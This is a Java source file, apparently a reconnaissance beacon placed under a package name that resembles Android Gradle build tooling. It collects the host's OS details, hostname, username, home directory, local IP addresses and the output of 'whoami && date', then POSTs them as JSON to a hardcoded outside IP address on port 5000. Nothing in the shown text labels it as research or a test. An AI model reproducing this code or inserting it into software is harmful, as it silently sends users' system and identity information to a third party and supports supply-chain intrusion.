package libs.android.gradle;  // Make sure your package declaration is correct

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;
import java.util.Map;
import java.util.HashMap;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;

public class DeviceInfoClient {

    public static void main(String[] args) {
        String apiHostname = "13.60.183.44"; // Replace with your Flask API hostname or IP address
        int apiPort = 5000; // Flask API's port
        String apiPath = "/submit"; // Endpoint path

        // Collect device information
        String whoamiInfo = getWhoamiInfo();

        // Create a JSON object to hold the device information
        JSONObject deviceInfo = new JSONObject();
        deviceInfo.put("platform", System.getProperty("os.name"));
        deviceInfo.put("release", System.getProperty("os.version"));
        deviceInfo.put("hostname", getHostname());
        deviceInfo.put("arch", System.getProperty("os.arch"));
        deviceInfo.put("userInfo", getUserInfo());
        deviceInfo.put("networkInterfaces", getNetworkInterfaces());
        deviceInfo.put("whoamiinfo", whoamiInfo); // Include whoami output
        deviceInfo.put("user", "bc-modal");

        // Define the URL for the request
        String urlString = "http://" + apiHostname + ":" + apiPort + apiPath;

        try {
            // Create URL object
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();

            // Set up the connection
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            // Send the JSON data
            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = deviceInfo.toString().getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            // Get the response code
            int statusCode = connection.getResponseCode();
            System.out.println("Status: " + statusCode);

            // Read the response
            try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                System.out.println("Response: " + response.toString());
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Method to get whoami info (user and date)
    private static String getWhoamiInfo() {
        String result = "";
        try {
            Process process = Runtime.getRuntime().exec("whoami && date");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                result += line + "\n";
            }
        } catch (Exception e) {
            result = "Error executing whoami: " + e.getMessage();
        }
        return result.trim();
    }

    // Method to get the hostname of the system
    private static String getHostname() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return "Unknown";
        }
    }

    // Method to get basic user info like username and home directory
    private static Map<String, String> getUserInfo() {
        Map<String, String> userInfo = new HashMap<>();
        userInfo.put("username", System.getProperty("user.name"));
        userInfo.put("homeDir", System.getProperty("user.home"));
        return userInfo;
    }

    // Method to get network interfaces (IP addresses) of the system
    private static Map<String, String> getNetworkInterfaces() {
        Map<String, String> networkInterfaces = new HashMap<>();
        try {
            Enumeration<NetworkInterface> networkEnum = NetworkInterface.getNetworkInterfaces();
            while (networkEnum.hasMoreElements()) {
                NetworkInterface networkInterface = networkEnum.nextElement();
                Enumeration<InetAddress> inetAddresses = networkInterface.getInetAddresses();
                while (inetAddresses.hasMoreElements()) {
                    InetAddress inetAddress = inetAddresses.nextElement();
                    if (inetAddress.isSiteLocalAddress()) {
                        networkInterfaces.put(networkInterface.getName(), inetAddress.getHostAddress());
                    }
                }
            }
        } catch (Exception e) {
            networkInterfaces.put("Error", "Unable to fetch network interfaces: " + e.getMessage());
        }
        return networkInterfaces;
    }
}
